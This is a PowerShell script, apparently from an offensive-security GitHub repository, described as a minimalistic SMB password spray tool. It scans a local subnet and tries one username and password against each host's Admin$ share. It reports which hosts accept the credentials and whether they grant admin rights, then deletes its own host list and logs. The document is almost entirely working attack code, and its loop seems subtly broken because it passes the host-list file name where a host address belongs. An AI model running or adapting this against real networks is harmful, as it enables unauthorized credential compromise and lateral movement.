<#
.SYNOPSIS
   Minimalistic SMB password spray attack tool

   Author: @r00t-3xp10it
   Addapted From: @InfosecMatter
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Get-SmbMapping, New-PSDrive {native}
   Optional Dependencies: Ping-Object {native}
   PS cmdlet Dev version: v1.0.6

.DESCRIPTION
   The main objective of the smblogin-spray.PS1 tool is to perform SMB login attacks. (spray)
   We are simply a standard non-privileged domain user and we would like to test whether we can
   compromise other Windows systems in the network by performing SMB login attacks against them.

.NOTES
   This tool uses the New-PSDrive PowerShell cmdlet to authenticate against the '\\TARGET\Admin$' network
   share just like the smb_login scanner from Metasploit does. By observing results from the cmdlet, the
   tool determines whether the credentials were correct and the privileges sufficient. If we are able to
   mount the '\\TARGET\Admin$' share, it means that we have administrative privileges on the share.

   CmdLet scans the LAST range (default) of target ip address in search of hosts alive inside Local LAN.
   If you wish to use your own ip address database, then write all ip addresses to be scanned inside of
   'hosts.log' file and place it on the same directory as 'smblogin-spray.ps1' that cmdlet will use it. 

.Parameter DomainName
   The Domain Name to authenticate (default: DomainName\UserName)

.Parameter Password
   The SMB Password to authenticate (default: admin)

.Parameter LogFile
   Store results in logfile? (default: false)

.Parameter StartRange
   Start of range to scan (default: 1)

.Parameter EndRange
   End of range to scan (default: 255)

.Parameter Filter
   Accepts values: active, all (default: all)

.Parameter Force
   Bypass local workstation checks? (default: false)

.EXAMPLE
   PS C:\> .\smblogin-spray.ps1 -DomainName "CORP\bkpadmin" -Password "P@ssw0rd"
   Brute force ip address ranges from 1 to 255 (eg: 192.168.1.1 TO 192.168.1.255)

.EXAMPLE
   PS C:\> .\smblogin-spray.ps1 -DomainName "anonymous" -Password "admin" -StartRange "200"
   Brute force ip address ranges from 200 to 255 (eg: 192.168.1.200 TO 192.168.1.255)

.EXAMPLE
   PS C:\> .\smblogin-spray.ps1 -StartRange "69" -EndRange "80"
   Brute force ip address ranges from 69 to 80 (eg: 192.168.1.69 TO 192.168.1.80)

.EXAMPLE
   PS C:\> .\smblogin-spray.ps1 -StartRange "72" -EndRange "72" -LogFile "True"
   Brute force 192.168.1.72 single ip address and store results in logfile

.EXAMPLE
   PS C:\> .\smblogin-spray.ps1 -Filter "active" -LogFile "True"
   Brute force ip address ranges from 200 to 255 ( active hosts )

.INPUTS
   None. You cannot pipe objects into smblogin-spray.ps1

.OUTPUTS
   * Brute force Local Hosts SMB service creds.

   [fail] 192.168.1.73: 'CORP\bkpadmin,P@ssw0rd'
   [fail] 192.168.1.74: 'CORP\bkpadmin,P@ssw0rd'
   [cred] 192.168.1.75: 'CORP\bkpadmin,P@ssw0rd' [success]
   [fail] 192.168.1.76: 'CORP\bkpadmin,P@ssw0rd'
   [cred] 192.168.1.77: 'CORP\bkpadmin,P@ssw0rd' [success,admin]

   * Total of credentials found: '2'

.LINK
   https://github.com/r00t-3xp10it/redpill/blob/main/bin/smblogin-spray.ps1
   https://www.infosecmatter.com/smb-brute-force-attack-tool-in-powershell-smblogin-ps1
   https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2019-ps/smbshare/Get-SmbMapping.md
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$DomainName="$Env:COMPUTERNAME\$Env:USERNAME",
   [string]$Password="admin",
   [string]$LogFile="false",
   [string]$Force="false",
   [string]$Filter="all",
   [string]$Egg="false",
   [int]$EndRange='255',
   [int]$StartRange='1'
)


If($Egg -ieq "false")
{
   write-host " * Brute force Local Hosts SMB service creds." -ForeGroundColor Green
}
If($LogFile -ieq "True")
{
   echo "* Brute force Local Hosts SMB service creds.`n" | Out-File "smblogin.results.log" -Encoding ascii -Force
}


If($Force -ieq "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Checks if workstation service is enabled [local]
   #>

   $TestSMBService = Get-SmbMapping -EA SilentlyContinue
   If(-not($TestSMBService) -or $TestSMBService -ieq $null)
   {
      write-host " *" -ForegroundColor Red -NoNewline;
      write-host " workstation service disabled [" -ForegroundColor DarkGray -NoNewline;
      write-host "abort" -ForegroundColor Red -NoNewline;
      write-host "]" -ForegroundColor DarkGray -NoNewline;
      exit #Exit @smblogin-spray
   }
}

[int]$Counter = 0
$AddrBook = "hosts.log"
If(-not(Test-Path -Path "$AddrBook" -EA SilentlyContinue))
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Creates hosts.log with local lan host addresses.

   .NOTES
      Remark: If invoked -Filter 'active' then cmdlet grabs only the 'active' host ip addresses.
      CmdLet scans the LAST range (default) of target ip address in search of hosts alive inside
      Local LAN. If you wish to use your own ip address database, then write all ip addresses to
      be scanned inside of 'hosts.log' and place it on the same directory as 'smblogin-spray.ps1'.
   #>

   $EndRange = $EndRange+1
   #Builds the required hosts.log file [ gateway: 255.255.255.0 ]
   $ping = New-Object System.Net.Networkinformation.ping        # Ping Object
   $Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1] # 192.168.1.72
   $DelLastRange = $Local_Host.split('.')[-1]                   # 72
   $RangeList = $Local_Host -replace "$DelLastRange",""         # 192.168.1.

   For($i=$StartRange; $i -lt $EndRange; $i++)
   {
      If($Filter -ieq "active")
      {
         #Filter only ACTIVE host ip addresses ( slower )
         $IsAlive = $ping.Send("${RangeList}${i}", 300) | Where-Object {$_.Status -Match 'Success'}
         If($IsAlive)
         {
            echo "${RangeList}${i}" | Out-File "$AddrBook" -Encoding ascii -Force -Append
         }
      }
      Else
      {
         #Sellect Active \ Not-Active host ip addresses ( fast )
         echo "${RangeList}${i}" | Out-File "$AddrBook" -Encoding ascii -Force -Append
      }
   }
}

write-host ""
#Internal Credentials Manager
$DomainName = $DomainName -replace "^\.\\", "$AddrBook\"
$Credential = New-Object System.Management.Automation.PSCredential $DomainName, ($Password | ConvertTo-SecureString -AsPlainText -Force)
If(Test-Path -Path "smblogin.results.log" -EA SilentlyContinue){Remove-Item -Path "smblogin.results.log" -Force}

ForEach($Item in Get-Content -Path "$AddrBook" -EA SilentlyContinue)
{

   try{
      If(New-PSDrive -Name Share -PSProvider FileSystem -Root \\$AddrBook\Admin$ -Credential $Credential -EA SilentlyContinue)
      {
         $Counter++
         Remove-PSDrive Share
         Write-Host "   " -NoNewline;
         Write-Host "[cred]" -ForegroundColor Green -BackgroundColor Black -NoNewline;
         Write-Host " ${Item}: " -NoNewline;
         Write-Host "'$DomainName,$Password'" -ForegroundColor Green -NoNewline;
         Write-Host " [" -NoNewline; 
         Write-Host "success,admin" -ForegroundColor Green -NoNewline; 
         Write-Host "]";
         If($LogFile -ieq "True")
         {
            echo "[cred] ${Item}: $DomainName,${Password} [success,admin]" | Out-File "smblogin.results.log" -Encoding ascii -Append
         }
      }
      Else
      {
         If($Egg -ieq "false"){Start-Sleep -Milliseconds 500}
         If($error[0].exception -iMatch 'password is incorrect')
         {
            Write-Host "   " -NoNewline;
            Write-Host "[fail]" -ForegroundColor Red -BackgroundColor Black -NoNewline;
            Write-Host " ${Item}: " -NoNewline;
            Write-Host "'$DomainName,$Password'" -ForegroundColor DarkGray; 
            If($LogFile -ieq "True")
            {
               echo "[fail] ${Item}: '$DomainName,${Password}' [incorrect password]" | Out-File "smblogin.results.log" -Encoding ascii -Append
            }
         }
         ElseIf($error[0].exception -iMatch 'Access is denied')
         {
            $Counter++
            Write-Host "   " -NoNewline;
            Write-Host "[cred]" -ForegroundColor Green -BackgroundColor Black -NoNewline;
            Write-Host " ${Item}: " -NoNewline;
            Write-Host "'$DomainName,$Password'" -ForegroundColor DarkGray -NoNewline;
            Write-Host " [" -NoNewline;
            Write-Host "success" -ForegroundColor Yellow -NoNewline;
            Write-Host "]";
            If($LogFile -ieq "True")
            {
               echo "[cred] ${Item}: '$DomainName,${Password}' [success,non-admin]" | Out-File "smblogin.results.log" -Encoding ascii -Append
            }
         }
         Else
         {
            Write-Host "   " -NoNewline;
            Write-Host "[fail]" -ForegroundColor Red -BackgroundColor Black -NoNewline;
            Write-Host " ${Item}: " -NoNewline;
            Write-Host "'$DomainName,$Password'" -ForegroundColor DarkGray;
            If($LogFile -ieq "True")
            {
               echo "[fail] ${Item}: '$DomainName,$Password' [unreachable]" | Out-File "smblogin.results.log" -Encoding ascii -Append
            }
         }
      }

   }catch{
      write-host "   [Error] Fail to retrieve SMB status .." -ForegroundColor Red -BackgroundColor Black
   }

}

write-host ""
#Clean ALL Artifacts left behind!
If($LogFile -ieq "false")
{
   Remove-Item -Path "smblogin.results.log" -EA SilentlyContinue -Force
}
Else
{
   write-host " *" -ForegroundColor Green -NoNewline;
   write-host " Logfile: '" -ForegroundColor Blue -NoNewline;
   write-host "$pwd\smblogin.results.log" -ForegroundColor Green -NoNewline;
   write-host "'" -ForegroundColor Blue;
}
Remove-Item -Path "$AddrBook" -EA SilentlyContinue -Force

If($Counter -gt 0)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Prints onscreen total of creds found.
   #>

   write-host " *" -ForegroundColor Green -NoNewline;
   write-host " Total of credentials found: '" -ForegroundColor Blue -NoNewline;
   write-host "$Counter" -ForegroundColor Green -NoNewline;
   write-host "'`n" -ForegroundColor Blue;
}